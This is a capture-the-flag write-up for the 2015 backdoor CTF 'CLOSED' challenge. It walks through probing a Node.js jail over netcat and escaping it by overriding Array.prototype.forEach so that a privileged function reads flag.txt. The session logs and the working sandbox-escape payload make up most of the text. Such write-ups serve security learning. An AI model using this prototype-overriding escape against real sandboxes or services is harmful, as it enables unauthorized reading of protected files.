# backdoor CTF 2015: [CLOSED](https://backdoor.sdslabs.co/challenges/CLOSED)

**Category:** Exploit
**Points:** 300
**Author:** Amanpreet Singh
**Difficulty:** TODO
**Solves:** 13
**Description:**

* <https://backdoor.sdslabs.co/challenges/CLOSED>

> All paths have been closed. Get the flag: `nc 128.199.107.60 8000`. Submit sha256 of flag obtained.

## Write-up

by [mathiasbynens](https://github.com/mathiasbynens)

[Read the write-up for the _Concealed_ challenge first.](https://github.com/ctfs/write-ups-2015/tree/master/backdoor-ctf-2015/exploit/concealed) This challenge is similar.

Let’s connect to the service:

```bash
$ nc 128.199.107.60 8000
######################################
####           CLOSED             ####
######################################

Welcome to CLOSED Jail
You have access to object named sandboxed and its functions
Rest everything is sandboxed, don’t be a jerk and break something
Wrap your code in a function and return what you want as output
Flag is in flag.txt file in same directory.
Get the flag :D!

home@jail:$
```

The welcome message reveals that the flag is hidden in `flag.txt`. Some initial testing reveals it’s a JavaScript sandbox:

```
home@jail:$ sandboxed
TypeError: Property 'sandboxed' of object #<Object> is not a function

home@jail:$ function() { return sandboxed; }
[object Object]

home@jail:$ function() { return Object.keys(sandboxed); }
readFlag,print

home@jail:$ sandboxed.readFlag
Oh shit! I am reading the wrong file.

home@jail:$ function() { return sandboxed.readFlag; }
function () {
  var text = '';
  flagfiles.forEach(function (file) {
    text += fs.readFileSync(file);
  });

  return text;
}

home@jail:$ sandboxed.print
undefined

undefined

home@jail:$ function() { return sandboxed.print; }
function (data) {
  sys.print(data + '\n' + '\n');
}
```

Unfortunately, the sandbox runs in strict mode, which means we can’t reuse the trick we used to solve [_Concealed_](https://github.com/ctfs/write-ups-2015/tree/master/backdoor-ctf-2015/exploit/concealed) to reveal the rest of the source code:

```
home@jail:$ function() { return String(arguments.callee.caller); }
TypeError: 'caller', 'callee', and 'arguments' properties may not be accessed on strict mode functions or the arguments objects for calls to them
```

It seems the challenge must be solved some other way. Let’s take a closer look at the `readFlag` function:

```
home@jail:$ function() { return sandboxed.readFlag; }
function () {
  var text = '';
  flagfiles.forEach(function (file) {
    text += fs.readFileSync(file);
  });

  return text;
}
```

We can’t control the value of the `flagfiles` variable, but if we could, the challenge could be solved by doing something like `flagfiles = ['flag.txt']`. However, we can overwrite `Array.prototype.forEach` as follows:

```js
Array.prototype.forEach = function(callback, array) {
  return callback.call(array, 'flag.txt');
};
```

Now, when `sandboxed.readFlag` gets called, it will return the contents of `flag.txt`:

```
home@jail:$ function() { Array.prototype.forEach = function(callback, array) { return callback.call(array, 'flag.txt'); }; return sandboxed.readFlag(); }
flag: [redacted]
```

Now that we have the flag, all that’s left to do is to hash it using SHA-256 so it can be submitted:

```bash
$ printf "$flag" | sha256sum
```

## Other write-ups and resources

* none yet
